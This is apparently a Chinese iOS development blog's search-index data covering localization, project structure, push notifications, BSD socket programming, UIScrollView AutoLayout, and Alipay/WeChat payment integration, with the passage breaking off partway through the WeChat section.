多语言文件(MyFree)的名称 , comment,预留参数 一般设为nilroot.title = NSLocalizedStringFromTable([dic objectForKey:@&quot;title&quot;],@&quot;MyFree&quot;,nil);\n\nlabel.text &#x3D; NSLocalizedStringFromTable(@”labelKey”, @”content”, nil);&#x2F;&#x2F;使用NSLocalizedStringFromTable方法取出设置好的多语言内容,第一个参数为对应的key,第二参数是多语言文件名,第三个参数是对这个内容的注释,可以为nil\n","categories":["iOS"],"tags":["I18N","l10n"]},{"title":"iOS 开发常用网址","url":"/2016/01/18/iOS-Usage-Website/","content":"开发社区\niOS 开源代码库 http://www.code4app.com/\n苹果开发中文社区 http://www.cocoachina.com/\nGithub https://github.com\nObjC 中国 http://objccn.io/\n歪果仁教程：Ray Wenderlich | Tutorials for iPhone &#x2F; iOS Developers and Gamers http://www.raywenderlich.com/\n开发者头条，各类技术干货 http://toutiao.io\n\n开源项目\nYY作者常用第三方库整理 http://github.ibireme.com/github/list/ios/\n最全开源项目和学习资料 http://codecloud.net/ios-mac-study-5155.html\n常用库整理 http://www.cocoachina.com/ios/20150713/12503.html\n歪果仁整理的关于iOS开发技术 https://github.com/vsouza/awesome-ios\niOS开发UI https://github.com/cjwirth/awesome-ios-ui\n\n","categories":["iOS"],"tags":["开发者论坛"]},{"title":"iOS项目的目录结构和开发流程","url":"/2016/01/20/iOS-directory-and-flow/","content":"目录结构一个合理的目录结构首先应该是清晰的，让人一眼看上去就能大概了解目录的职责，且容易应对新的变化。\n常规的两种结构：\n主目录按照业务分类，内目录按照模块分类(主目录按照MVC架构分类，内部根据项目模块分类)\n\n优点：相对比较快定位对应的业务。缺点：模块相关类太过分散，需要来回切换寻找文件，不方便开发。\n\n├── Application├── Categories├── Controllers│   ├── Blog│   ├── Comment│   ├── Login│   ├── News|\t...├── Models│   ├── OSC│   └── Team├── Resource│   ├── CSS│   ├── html│   ├── js├── Utils├── Vendor└── Views\n\n主目录按照模块分类，内目录按照业务分类\n\n优点：对模块的类集中化，方便管理与开发。缺点：当几个模块共用一些类时，不太好归类。\n\n├── Application├── Categories│├── Blog|\t├── Controller|\t├── View|\t├── Model├── Login|\t├── Controller|\t├── View|\t├── Model|\t....├── Resource│   ├── CSS│   ├── html│   ├── js├── Utils├── Vendor\n\n\n\n常见目录结构Application这个目录下放的是AppDelegate.h(.m)文件，是整个应用的入口文件，接口文件都可以放在该目录下。\nControllers视图控制器相关类。\nControllers    ├── ActivitiesViewController.h    ├── ActivitiesViewController.m    ├── ActivityBasicInfoCell.h    ├── ActivityBasicInfoCell.m    ├── ActivityCell.h    ├── ActivityCell.m   \t...\n\nModels这个目录下放一些与数据相关的Model文件。\nModels    |- BaseModel.h    |- BaseModel.m    |- CollectionModel.h    |- CollectionModel.m    ...\n\nViews视图，自定义视图，被重用的视图。\nViews\t├── EditingBar.h    ├── EditingBar.m    ├── GrowingTextView.h    ├── GrowingTextView.m    ...\n\nMacros这个目录下放了整个应用会用到的宏定义。\nMacro\t|- Macros.h    |- AppMacro.h    |- NotificationMacro.h    |- VendorMacro.h    |- UtilsMacro.h    ...\n\nAppMacro.h 里放app相关的宏定义，如:\n// 表情相关#define EMOTION_CACHE_PATH @&quot;cachedemotions&quot;#define EMOTION_RECENT_USED @&quot;recentusedemotions&quot;#define EMOTION_CATEGORIES @&quot;categoryemotions&quot;#define EMOTION_TOPICS @&quot;emotiontopics&quot;// 收藏相关#define COLLECT_CACHE_PATH @&quot;collected&quot;// 配图相关#define WATERFALL_ITEM_HEIGHT_MAX 300#define WATERFALL_ITEM_WIDTH 146\n\nNotificationMacro.h 里放的是通知相关的宏定义。\nUtilsMacro.h 里放的是一些方便使用的工具宏定义。\n#define UIColorFromRGB(r,g,b) [UIColor colorWithRed:r/255.0 green:g/255.0 blue:b/255.0 alpha:1]#define NSStringFromInt(intValue) [NSString stringWithFormat:@&quot;%d&quot;,intValue]\n\nVendorMacro.h 里放一些第三方常量\n#define UMENG_KEY @&quot;xxxxx&quot;#define UMENG_CHANNEL_ID @&quot;xxx&quot;\n\n如果有新的类型的宏定义，可以再新建一个相关的Macro.h。\nHelpers&#x2F;Utils这个目录放一些助手类&#x2F;工具类。自己实现的一些通用性较好的功能代码，这些代码有比较好的接口且与本项目不存在耦合，可直接复用于其他项目。\nHelpers    |- TPKShareHelper    |- TPDBHelper    |- TPKEmotionHelper    ...\n\nVendors这个目录放第三方的类库&#x2F;SDK，如UMeng、WeiboSDK、WeixinSDK等等。\nResources这个目录下放的是app会用到的一些资源文件。\n开发流程","categories":["iOS"],"tags":["目录结构","开发流程"]},{"title":"iOS 推送通知","url":"/2016/01/21/iOS-Notification/","content":"推送通知是当程序没有启动或不在前台运行时，告诉用户有新消息的一种途径。\n有远程推送和本地推送之分。\n\n\n本地推送本地推送就是由应用程序发起的推送通知，不经过服务器。\n应用场景一般用于不需要网络的提醒类情况\n\n事件提醒类：到了我们自定义的时间，就会弹出一些信息告诉我们该干什么了，例如闹钟\n游戏类：每日任务提醒，一到八点双倍经验时刻开启，就准时提醒用户登陆\n书籍类：你有多少天没有看书了，需要学习哦\n健康类：亲~你好多天没吃药了，不要放弃治疗\n恶搞类：在你分手女朋友手机里安装一个软件，3个月后，自动开启xxx约你开房\n硬件类：蓝牙连接，当程序在后台时候与蓝牙断开，需要有一个提示告诉用户蓝牙连接断开\n记账类软件，会提醒我们的一些花销等等，比如超出额度。\n\n实现代码创建本地推送通知//ios8本地推送通知，添加一个授权方法if ([UIApplication instancesRespondToSelector:@selector(registerUserNotificationSettings:)])&#123;        [[UIApplication sharedApplication] registerUserNotificationSettings:[UIUserNotificationSettings settingsForTypes:UIUserNotificationTypeAlert|UIUserNotificationTypeBadge|UIUserNotificationTypeSound categories:nil]];    &#125;    UILocalNotification *localNotification = [[UILocalNotification alloc] init];//初始化本地通知    if (localNotification != nil) &#123;        NSDate *now = [NSDate new];        localNotification.fireDate = [now dateByAddingTimeInterval:15];//15秒后通知        localNotification.repeatInterval = NSCalendarUnitMinute;//循环次数，NSCalendarUnitMinute一分一次        localNotification.timeZone = [NSTimeZone defaultTimeZone];//UILocalNotification激发时间是否根据时区改变而改变        localNotification.applicationIconBadgeNumber += 1;//应用的红色数字        localNotification.soundName = UILocalNotificationDefaultSoundName;//声音，可以换成自己的，如：alarm.soundName = @&quot;myMusic.caf&quot;，自定义的声音文件播放时长必须在 30 秒以内。如果一个自定义的声音文件播放 超过 30 秒的限制，那将会被系统的声音替换        localNotification.alertBody = @&quot;我是通知内容&quot;;//提示信息 弹出提示框        localNotification.alertAction = @&quot;打开&quot;;//解锁按钮文字，就是在锁屏情况下有一个‘滑动来XXX’,这儿的XXX就是这里所设置的alertAction。如果不设置就是@“查看”        localNotification.hasAction = YES;//是否显示额外的按钮，为no时alertAction的设置不起作用，hasAction默认是YES        //通知的额外信息，不会展示出来，是用来判断通知是哪一条的额外信息        NSDictionary *infoDict = [NSDictionary dictionaryWithObject:@&quot;xiaofei&quot; forKey:@&quot;birthday&quot;];        localNotification.userInfo = infoDict;//添加额外的信息        [[UIApplication sharedApplication] scheduleLocalNotification:localNotification];//添加本地通知到推送队列中    &#125;\n\n注意：\n本地推送通知加入以后，程序被杀掉，推送通知依然可以运行\n当程序在前台时候我的推送通知虽然不会显示，但是依然会运行\n如果要弹出推送通知，需要你程序退出后台才可以显示，快捷键command+shift+h\n接收本地推送通知- (void)application:(UIApplication *)application didReceiveLocalNotification:(UILocalNotification *)notification &#123;    //处理收到的通知...    application.applicationIconBadgeNumber = 0;//应用程序角标清零&#125;\n\n取消本地推送通知\n取消指定通知\n\nUIApplication *app = [UIApplication sharedApplication];    NSArray* localNotifications = [app scheduledLocalNotifications];//获取当前应用所有的通知    if (localNotifications) &#123;      // 遍历通知，找到对应的通知        for (UILocalNotification* notification in localNotifications) &#123;            NSDictionary *dic = notification.userInfo;            if (dic) &#123;                NSString* key = [dic objectForKey:@&quot;key&quot;];                if ([key isEqualToString:@&quot;name&quot;]) &#123;                    //取消推送 （指定一个取消）                    [app cancelLocalNotification:notification];                    break;                &#125;            &#125;        &#125;    &#125;\n\n\n取消当前应用所有的推送\n\nUIApplication *app = [UIApplication sharedApplication];[app cancelAllLocalNotifications];\n\n\n\n远程推送通知远程推送通知是由服务器发送的消息经过苹果的APNS（Apple Push Notification Service）服务远程推送给设备。由于iOS操作系统限制，我们APP在后台不能做操作，也不能接收任何数据，所以需要用推送来接收消息。\n注意：\n1. 模拟器无法接收远程推送消息，只有真机可以\n2. 远程推送通知只能拥有付费的开发者账号才能创建\n应用场景\n聊天消息推送\n新闻推送\n影视剧推送\n小说更新推送\n游戏活动推送\n健康天气推送\n提醒业务：比如一些秀场应用，女主播上线了，可以发送通知给所有关注她的土豪们，来赶紧撒钱\n\n远程推送原理\n\n注册：为应用程序申请消息推送服务。此时你的设备会向APNs服务器发送注册请求。\nAPNs服务器接收请求，并将deviceToken返给你设备上的应用程序\n客户端应用程序将deviceToken发送给后台服务器程序，后台接收并储存\n后台服务器向APNs服务器发送推送消息\nAPNs服务器将消息发给deviceToken对应设备上的应用程序\n\n远程推送具体步骤应用程序的App ID添加Push Notifications服务—&gt;配置对应的证书—&gt;配置对应Provisioning Profiles文件—&gt;获取Device Token—&gt;服务器端通过deviceToken和APNS建立SSL连接—&gt;服务器端给APNS服务器发送推送消息\n\n创建App ID添加Push Notifications服务\n请参考教你一步一步获取App ID\n\n配置Push Notifications服务和相应证书，配置文件Provisioning Profiles文件\n参考：教你一步一步获取Provisioning Profiles\n\n获取deviceToken，需要在代码中实现\n\n注册远程推送通知\nif ([[[UIDevice currentDevice] systemVersion] floatValue] &gt;= 8.0) &#123;  UIUserNotificationType myTypes = UIRemoteNotificationTypeBadge | UIRemoteNotificationTypeAlert | UIRemoteNotificationTypeSound;  UIUserNotificationSettings *settings = [UIUserNotificationSettings settingsForTypes:myTypes categories:nil];  [[UIApplication sharedApplication] registerUserNotificationSettings:settings];  [[UIApplication sharedApplication] registerForRemoteNotifications];&#125;else&#123;  UIRemoteNotificationType myTypes = UIRemoteNotificationTypeBadge|UIRemoteNotificationTypeAlert|UIRemoteNotificationTypeSound;  [[UIApplication sharedApplication] registerForRemoteNotificationTypes:myTypes];&#125;\n\n注册远程通知成功回调，获取deviceToken\n- (void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken&#123;  NSLog(@&quot;deviceToken:%@&quot;,deviceToken);&#125;\n\n注册远程通知失败回调\n- (void)application:(UIApplication *)application didFailToRegisterForRemoteNotificationsWithError:(NSError *)error&#123;  NSLog(@&quot;注册失败，错误是：%@&quot;,error);&#125;\n\n\n想要收到推送消息，就必须要有后台服务器向APNs服务器发请求。\n1、公司自己开发后台服务器程序\n2、采用第三方的后台服务程序，比如：百度云推送\n\n程序正在使用或者退出的状态下，收到远程推送通知回调\n\n\n- (void)application:(UIApplication *)application didReceiveRemoteNotification:(NSDictionary *)userInfo&#123;\t//处理通知...    NSLog(@&quot;Receive remote notification : %@&quot;,userInfo);    application.applicationIconBadgeNumber = 0;&#125;\n\n集成第三方推送服务第三方推送\n极光推送\n蝴蝶推送\n个推\n信鸽推送\n百度云推送\n友盟推送\n\n集成极光推送极光推送基本信息极光推送网站：https://www.jpush.cn\n配置JPush的环境参考官方极光推送文档或者下载的SDK：\nJPush iOS集成指南\niOS SDK 开发教程\n","categories":["iOS"],"tags":["推送通知","远程推送","本地推送"]},{"title":"iOS Socket","url":"/2016/01/30/iOS-Socket/","content":"iOS网络编程层次结构iOS网络编程层次结构分为三层，从上往下依次为：\n\nCocoa层：NSURL，Bonjour，Game Kit，WebKit\nCore Foundation层：基于 C 的 CFNetwork 和 CFNetServices\nOS层：基于 C 的 BSD Socket\n\nCocoa层：是最上层的基于 Objective-C 的 API，比如 URL访问，NSStream，Bonjour，GameKit等，这是大多数情况下我们常用的 API。Cocoa 层是基于 Core Foundation 实现的。\nCore Foundation层：因为直接使用 socket 需要更多的编程工作，所以苹果对 OS 层的 socket 进行简单的封装以简化编程任务。该层提供了 CFNetwork 和 CFNetServices，其中 CFNetwork 又是基于 CFStream 和 CFSocket。\nOS层：最底层的 BSD Socket 提供了对网络编程最大程度的控制，但是编程工作也是最多的。因此，苹果建议我们使用 Core Foundation 及以上层的 API 进行编程。\n本文将介绍如何在 iOS 系统下使用最底层的 Socket 进行编程。\n\n\nSocketSocket是应用层与TCP&#x2F;IP协议族通信的中间软件抽象层，它是一组接口。\n\nTCP和UDP的区别TCP：面向连接、传输可靠(保证数据正确性,保证数据顺序)、用于传输大量数据(流模式)、速度慢，建立连接需要开销较多(时间，系统资源)。\nUDP：面向非连接、传输不可靠、用于传输少量数据(数据包模式)、速度快。\n关于TCP是一种流模式的协议，UDP是一种数据包模式的协议，这里要说明一下，TCP是面向连接的，也就是说，在连接持续的过程中，Socket中收到的数据都是由同一台主机发出的（劫持什么的不考虑），因此，知道保证数据是有序的到达就行了，至于每次读取多少数据自己看着办。\n而UDP是无连接的协议，也就是说，只要知道接收端的IP和端口，且网络是可达的，任何主机都可以向接收端发送数据。这时候，如果一次能读取超过一个报文的数据，则会乱套。比如，主机A向发送了报文P1，主机B发送了报文P2，如果能够读取超过一个报文的数据，那么就会将P1和P2的数据合并在了一起，这样的数据是没有意义的。\n常用的Socket类型有两种：流式Socket（SOCK_STREAM）和数据报式Socket（SOCK_DGRAM）。流式是一种面向连接的Socket，针对于面向连接的TCP服务应用；数据报式Socket是一种无连接的Socket，对应于无连接的UDP服务应用。\nTCP C&#x2F;S架构程序设计基本框架\nTCP 三次握手\n最形象理解：\n\n「你瞅啥？」\n「瞅你咋地？」\n「来咱俩唠唠。」\n然后就唠上了。\n\nTCP 四次挥手\n代码实现头文件#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;unistd.h&gt;#include &lt;ifaddrs.h&gt;\n\n服务端实现代码- (void)socketServer&#123;    int err;    // 1. 创建socket套接字    // 原型：int socket(int domain, int type, int protocol);    // domain：协议族 type：socket类型 protocol：协议    int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);    BOOL success = (fd != -1);    if (success) &#123;        NSLog(@&quot;Socket 创建成功&quot;);        // 地址结构体        struct sockaddr_in addr;        // 内存清空        memset(&amp;addr, 0, sizeof(addr));        // 内存大小        addr.sin_len=sizeof(addr);        // 地址族，在socket编程中只能是AF_INET        addr.sin_family=AF_INET;        // 端口号        addr.sin_port=htons(1024);        // 按照网络字节顺序存储IP地址        addr.sin_addr.s_addr=INADDR_ANY;        // 2. 建立地址和套接字的联系（绑定）        // 原型：bind(sockid, local addr, addrlen)        err=bind(fd, (const struct sockaddr *)&amp;addr, sizeof(addr));        success=(err==0);    &#125;    // 3. 服务器端侦听客户端的请求    if (success) &#123;        NSLog(@&quot;绑定成功&quot;);        // listen( Sockid ,quenlen) quenlen 并发队列        err=listen(fd, 5);//开始监听        success=(err==0);    &#125;    if (success) &#123;        NSLog(@&quot;监听成功&quot;);        // 4. 一直阻塞等到客户端的连接        while (true) &#123;            struct sockaddr_in peeraddr;            int peerfd;            socklen_t addrLen;            addrLen = sizeof(peeraddr);            NSLog(@&quot;等待客户端的连接请求&quot;);            // 5. 服务器端等待从编号为Sockid的Socket上接收客户端连接请求            // 原型：newsockid=accept(Sockid，Clientaddr, paddrlen)            peerfd = accept(fd, (struct sockaddr *)&amp;peeraddr, &amp;addrLen);            success=(peerfd!=-1);            // 接收客户端请求成功            if (success) &#123;                NSLog(@&quot;接收客户端请求成功，客户端地址：%s, 端口号：%d&quot;,inet_ntoa(peeraddr.sin_addr), ntohs(peeraddr.sin_port));                send(peerfd, &quot;欢迎进入Socket聊天室&quot;, 1024, 0);                // 6. 创建新线程接收客户端发送的消息                [NSThread detachNewThreadSelector:@selector(reciveMessage:) toTarget:self withObject:@(peerfd)];            &#125;        &#125;    &#125;&#125;- (void)reciveMessage:(id) peerfd&#123;    int fd = [peerfd intValue];    char buf[1024];    ssize_t bufLen;    size_t len=sizeof(buf);    // 循环阻塞接收客户端发送的消息    do &#123;        bufLen = recv(fd, buf, len, 0);        // 当返回值小于等于零时，表示socket异常或者socket关闭，退出循环阻塞接收消息        if (bufLen &lt;= 0) &#123;            break;        &#125;        // 接收到的信息        NSString* msg = [NSString stringWithCString:buf encoding:NSUTF8StringEncoding];        NSLog(@&quot;来自客户端，消息内容：%@&quot;, msg);        memset(buf, 0, sizeof(buf));    &#125; while (true);    // 7. 关闭    close(fd);&#125;\n\n客户端代码- (void)createSocketClient&#123;    int err;    // 创建socket套接字    int fd =socket(AF_INET, SOCK_STREAM, 0);    BOOL success=(fd!=-1);    struct sockaddr_in addr;    if (success) &#123;        NSLog(@&quot;Socket创建成功&quot;);        memset(&amp;addr, 0, sizeof(addr));        addr.sin_len = sizeof(addr);        addr.sin_family = AF_INET;        addr.sin_addr.s_addr = INADDR_ANY;        // 建立地址和套接字的联系        err = bind(fd, (const struct sockaddr *)&amp;addr, sizeof(addr));        success = (err==0);    &#125;    if (success) &#123;        struct sockaddr_in serveraddr;        memset(&amp;serveraddr, 0, sizeof(serveraddr));        serveraddr.sin_len=sizeof(serveraddr);        serveraddr.sin_family=AF_INET;        // 服务器端口        serveraddr.sin_port=htons(1024);        // 服务器的地址        serveraddr.sin_addr.s_addr=inet_addr(&quot;192.168.2.5&quot;);        socklen_t addrLen;        addrLen =sizeof(serveraddr);        NSLog(@&quot;连接服务器中...&quot;);        err=connect(fd, (struct sockaddr *)&amp;serveraddr, addrLen);        success=(err==0);        if (success) &#123;            // getsockname 是对tcp连接而言。套接字socket必须是已连接套接字描述符。            err =getsockname(fd, (struct sockaddr *)&amp;addr, &amp;addrLen);            success=(err==0);            if (success) &#123;                NSLog(@&quot;连接服务器成功，本地地址：%s，端口：%d&quot;,inet_ntoa(addr.sin_addr),ntohs(addr.sin_port));                [NSThread detachNewThreadSelector:@selector(reciveMessage:) toTarget:self withObject:@(fd)];            &#125;        &#125;        else&#123;            NSLog(@&quot;connect failed&quot;);        &#125;    &#125;&#125;- (void)reciveMessage:(id) peerfd&#123;    int fd = [peerfd intValue];    char buf[1024];    ssize_t bufLen;    size_t len=sizeof(buf);    // 循环阻塞接收消息    do &#123;        bufLen = recv(fd, buf, len, 0);        // 当返回值小于等于零时，表示socket异常或者socket关闭，退出循环阻塞接收消息        if (bufLen &lt;= 0) &#123;            break;        &#125;        // 接收到的信息        NSString* msg = [NSString stringWithCString:buf encoding:NSUTF8StringEncoding];        NSLog(@&quot;来自服务端，消息内容：%@&quot;, msg);    &#125; while (true);    // 7. 关闭    close(fd);&#125;\n\n\n\nUDP C&#x2F;S架构程序设计基本框架\n字节顺序计算机数据表示存在两种字节顺序：NBO与HBO\n网络字节顺序NBO（Network Byte Order）：\n\n  按从高到低的顺序存储，在网络上使用统一的网络字节顺序，可以避免兼容性问题。\n\n主机字节顺序（HBO，Host Byte Order）：\n\n不同的机器HBO不相同，与CPU设计有关，数据的顺序是由cpu决定的，而与操作系统无关。\n不同的CPU有不同的字节顺序类型，这些字节顺序类型指的是整数在内存中保存的顺序，即主机字节顺序。常见的有两种：\n\n\n\n序号\n英文名\n中文名\n描述\n\n\n\n1\nbig-endian\n大尾顺序\n地址的低位存储值的高位\n\n\n2\nlittle-endian\n小尾顺序\n地址的低位存储值的低位\n\n\n如 Intelx86结构下,short型数0x1234表示为34 12, int型数0x12345678表示为78 56 34 12如IBM power PC结构下,short型数0x1234表示为12 34, int型数0x12345678表示为12   34 56 78\n\n网络字节顺序与本地字节顺序之间的转换函数：\nhtonl()--&quot;Host to Network Long&quot;ntohl()--&quot;Network to Host Long&quot;htons()--&quot;Host to Network Short&quot;ntohs()--&quot;Network to Host Short&quot;\n\n地址转换方法in_addr_t inet_addr(const char *)将一个点间隔地址转换成一个in_addr\nchar *inet_ntoa(struct in_addr)将网络地址转换成“.”点隔的字符串格式。\nint inet_aton(const char *, struct in_addr *)将一个字符串IP地址转换为一个32位的网络序列IP地址。\n获取地址用getsockname获得本地ip和port用getpeername获得对端ip和port套接字socket必须是已连接套接字描述符。\n获取本地IP地址参考stackoverflow链接：http://stackoverflow.com/questions/7072989/iphone-ipad-osx-how-to-get-my-ip-address-programmatically\n// 导入头文件#include &lt;ifaddrs.h&gt;\n\n// 实现代码- (NSString *)getIPAddress &#123;    NSString *address = @&quot;error&quot;;    struct ifaddrs *interfaces = NULL;    struct ifaddrs *temp_addr = NULL;    int success = 0;    // retrieve the current interfaces - returns 0 on success    success = getifaddrs(&amp;interfaces);    if (success == 0) &#123;        // Loop through linked list of interfaces        temp_addr = interfaces;        while(temp_addr != NULL) &#123;            if(temp_addr-&gt;ifa_addr-&gt;sa_family == AF_INET) &#123;                // Check if interface is en0 which is the wifi connection on the iPhone                if([[NSString stringWithUTF8String:temp_addr-&gt;ifa_name] isEqualToString:@&quot;en0&quot;]) &#123;                    // Get NSString from C String                    address = [NSString stringWithUTF8String:inet_ntoa(((struct sockaddr_in *)temp_addr-&gt;ifa_addr)-&gt;sin_addr)];                &#125;            &#125;            temp_addr = temp_addr-&gt;ifa_next;        &#125;    &#125;    // Free memory    freeifaddrs(interfaces);    return address;&#125;\n\n第三方库CocoaAsyncSocket：https://github.com/robbiehanson/CocoaAsyncSocket\nCocoaAsyncSocket provides easy-to-use and powerful asynchronous socket libraries for Mac and iOS. The classes are described below.\n参考链接\nhttp://www.coderyi.com/archives/429\nhttp://www.cnblogs.com/kesalin/archive/2013/04/13/cocoa_socket.html\nhttp://my.oschina.net/joanfen/blog/287238\n\n","categories":["iOS"],"tags":["Socket","TCP/IP"]},{"title":"UIScrollView的子视图实现AutoLayout布局","url":"/2016/02/18/UIScrollView-AutoLayout/","content":"UIScrollView中子视图建立约束不能实现滚动，要实现子视图的AutoLayout布局需要借助UIView来实现。\n具体实现步骤\n添加一个UIView作为UIScrollView的ContentView，之后将之前直接添加到UIScrollView中的子视图添加到ContentView中\n为ContentView建立6个约束，四条边的约束、高度和宽度的约束。\n若要实现UIScrollView垂直滚动修改Equal Height约束的优先级为Low(250)，若要实现UIScrollView水平滚动修改Equal Width约束的优先级为Low(250)\n将原本添加到UIScrollView中的子视图添加到ContentView，为子视图建立约束\n若是垂直滚动，需要为最下方的子视图添加一个Bottom Space to SuperView约束；若是水平滚动，需要设置最右方的子视图添加一个Trailing space to SuperView约束\n最终实现在UIScrollView的子视图通过AutoLayout布局实现滚动效果\n\nDemo 下载https://github.com/xwal/Demo/tree/master/UIScrollViewAutoLayout\n","categories":["iOS"],"tags":["UIScrollView","AutoLayout"]},{"title":"iOS 支付","url":"/2016/01/21/iOS-Payment/","content":"iOS支付分为两类，第三方支付和应用内支付（内购）。\n第三方支付包括：支付宝支付、微信支付、银联支付、百度钱包、京东支付等等。\n应用内支付（In-App Purchase）：在应用程序内购买虚拟商品。如果你在App Store上销售的应用程序，将收到支付金额的70％。\n\n\n第三方支付弹出方式网页有些第三方支付没有安装客户端，可以直接弹出网页进行支付。（比如支付宝）\n调用APP手机中安装了客户端可以跳转到APP中进行支付。微信支付只能调用App进行支付。\n支付宝支付相关资料\n支付宝开放平台（SDK&amp;开发文档）：https://open.alipay.com/platform/home.htm\n移动支付集成：https://doc.open.alipay.com/doc2/detail?treeId=59&amp;articleId=103563&amp;docType=1\n商户服务平台（与支付宝签约需要填写的公司资料）：https://b.alipay.com/newIndex.htm\n\n支付流程\n在商户服务平台先与支付宝签约，获得商户ID（partner）和账号ID（seller），需要提供公司资质或者营业执照，个人无法申请。\n文档地址：https://doc.open.alipay.com/doc2/detail?treeId=58&amp;articleId=103542&amp;docType=1\n\n生成并下载相应的公钥私钥文件（加密签名用）\n文档地址：https://doc.open.alipay.com/doc2/detail.htm?spm=0.0.0.0.POMYKl&amp;treeId=58&amp;articleId=103543&amp;docType=1\n\n下载支付宝SDK：https://doc.open.alipay.com/doc2/detail?treeId=54&amp;articleId=103419&amp;docType=1\n\n生成订单信息\n\n调用支付宝客户端，由支付宝客户端跟支付宝安全服务器打交道\n\n支付完毕后返回支付结果给商户客户端和服务器\n\n\nSDK里有集成支付宝功能的一个Demo，集成支付功能的具体操作方式，可以参考Demo。\n代码集成流程参考文档地址：https://doc.open.alipay.com/doc2/detail.htm?spm=0.0.0.0.efmKDS&amp;treeId=59&amp;articleId=103676&amp;docType=1\n\n下载官方SDK\n下载地址：https://doc.open.alipay.com/doc2/detail?treeId=54&amp;articleId=103419&amp;docType=1\n本Demo使用的SDK是从官方Demo整理出来的，整理的SDK版本：201501022。\n目录结构如下：\n├── AlipaySDK.bundle├── AlipaySDK.framework├── Order.h├── Order.m├── Util├── libcrypto.a├── libssl.a└── openssl\n\n其中：\n\nAlipaySDK.bundle和AlipaySDK.framework是支付宝SDK\nOrder类：定义订单信息\nUtil、libcrypto.a、libssl.a、openssl：数据签名，对订单信息进行加密\n\n\n添加依赖库\n\n其中，需要注意的是：\n如果是Xcode 7.0之后的版本，需要添加libc++.tbd、libz.tbd；\n如果是Xcode 7.0之前的版本，需要添加libc++.dylib、libz.dylib。\n\n创建prefix header filePCH文件，添加#import &lt;Foundation/Foundation.h&gt;\n在Build Settings中的prefix header设置pch文件路径\n\n在Build Settings中Header Search Paths添加头文件引用路径，[文件路径]/AlipaySDK/\n\n在需要调用AlipaySDK的文件中，增加头文件引用。\n#import  &lt;AlipaySDK/AlipaySDK.h&gt;#import &quot;Order.h&quot;#import &quot;DataSigner.h&quot;\n\n生成订单信息及签名\n//将商品信息赋予AlixPayOrder的成员变量Order *order = [[Order alloc] init];order.partner = PartnerID; // 商户IDorder.seller = SellerID; // 账号IDorder.tradeNO = @&quot;20150923&quot;; //订单ID（由商家自行制定）order.productName = @&quot;iPhone6s&quot;; //商品标题order.productDescription = @&quot;新年打折&quot;; //商品描述order.amount = @&quot;0.01&quot;; //商品价格(单位：元)order.notifyURL =  @&quot;http://www.chaosky.me&quot;; //回调URL，支付成功或者失败回调通知自己的服务器进行订单状态变更order.service = @&quot;mobile.securitypay.pay&quot;;order.paymentType = @&quot;1&quot;;order.inputCharset = @&quot;utf-8&quot;;order.itBPay = @&quot;30m&quot;;order.showUrl = @&quot;m.alipay.com&quot;;// 应用注册scheme,在AlixPayDemo-Info.plist定义URL typesNSString *appScheme = @&quot;AliPayDemo&quot;;//将商品信息拼接成字符串NSString *orderSpec = [order description];NSLog(@&quot;orderSpec = %@&quot;,orderSpec);//获取私钥并将商户信息签名,外部商户可以根据情况存放私钥和签名,只需要遵循RSA签名规范,并将签名字符串base64编码和UrlEncodeid&lt;DataSigner&gt; signer = CreateRSADataSigner(PartnerPrivKey);NSString *signedString = [signer signString:orderSpec];//将签名成功字符串格式化为订单字符串,请严格按照该格式NSString *orderString = nil;if (signedString != nil) &#123;    orderString = [NSString stringWithFormat:@&quot;%@&amp;sign=\\&quot;%@\\&quot;&amp;sign_type=\\&quot;%@\\&quot;&quot;,                   orderSpec, signedString, @&quot;RSA&quot;];    [[AlipaySDK defaultService] payOrder:orderString fromScheme:appScheme callback:^(NSDictionary * resultDic) &#123;        NSLog(@&quot;reslut = %@&quot;,resultDic);    &#125;];&#125;\n\nXcode设置URL scheme\niPhone SDK可以把你的App和一个自定义的URL Scheme绑定。该URL Scheme可用来从浏览器或别的App启动你的App。\n配置方法：打开info.plist文件，找到或者添加如图所示的键值对：\n\nURL Scheme值为代码中对应的值，必须一致。\n\n配置支付宝客户端返回url处理方法\nAppDelegate.m文件中，增加引用代码：\n#import &lt;AlipaySDK/AlipaySDK.h&gt;\n\n在@implementation AppDelegate中增加如下代码：\n- (BOOL)application:(UIApplication *)application openURL:(NSURL *)url sourceApplication:(NSString *)sourceApplication annotation:(id)annotation&#123;    //如果极简开发包不可用，会跳转支付宝钱包进行支付，需要将支付宝钱包的支付结果回传给开发包    if ([url.host isEqualToString:@&quot;safepay&quot;]) &#123;        [[AlipaySDK defaultService] processOrderWithPaymentResult:url standbyCallback:^(NSDictionary * resultDic) &#123;    //【由于在跳转支付宝客户端支付的过程中，商户app在后台很可能被系统kill了，所以pay接口的callback就会失效，请商户对standbyCallback返回的回调结果进行处理,就是在这个方法里面处理跟callback一样的逻辑】            NSLog(@&quot;result = %@&quot;,resultDic);        &#125;];    &#125;    if ([url.host isEqualToString:@&quot;platformapi&quot;])&#123;//支付宝钱包快登授权返回authCode        [[AlipaySDK defaultService] processAuthResult:url standbyCallback:^(NSDictionary * resultDic) &#123;            //【由于在跳转支付宝客户端支付的过程中，商户app在后台很可能被系统kill了，所以pay接口的callback就会失效，请商户对standbyCallback返回的回调结果进行处理,就是在这个方法里面处理跟callback一样的逻辑】            NSLog(@&quot;result = %@&quot;,resultDic);        &#125;];    &#125;    return YES;&#125;\n\n微信支付需要提供公司资质或者营业执照，个人无法申请。\n相关文档\n微信开放平台：https://open.weixin.qq.com\n微信支付商户平台：https://pay.weixin.qq.com/index.php\n微信公众平台：https://mp.weixin.qq.com\n\n支付流程\n向微信注册你的应用程序id\n开发者应用登记页面 进行登记，登记并选择移动应用进行设置后，将获得AppID，可立即用于开发。但应用登记完成后还需要提交审核，只有审核通过的应用才能正式发布使用。\n\n\n微信APP支付接入商户服务中心\n参考文档链接：https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419317780&amp;token=&amp;lang=zh_CN\n\n下载微信SDK文件，如果在项目中应使用SDK的最新版。\n官方资源下载地址：https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419319164&amp;token=&amp;lang=zh_CN\n本Demo使用的SDK是从官方Demo整理出来的，整理的SDK版本：1.6.1。\n目录结构如下：\n├── SDKExport│   ├── WXApi.h│   ├── WXApiObject.h│   ├── 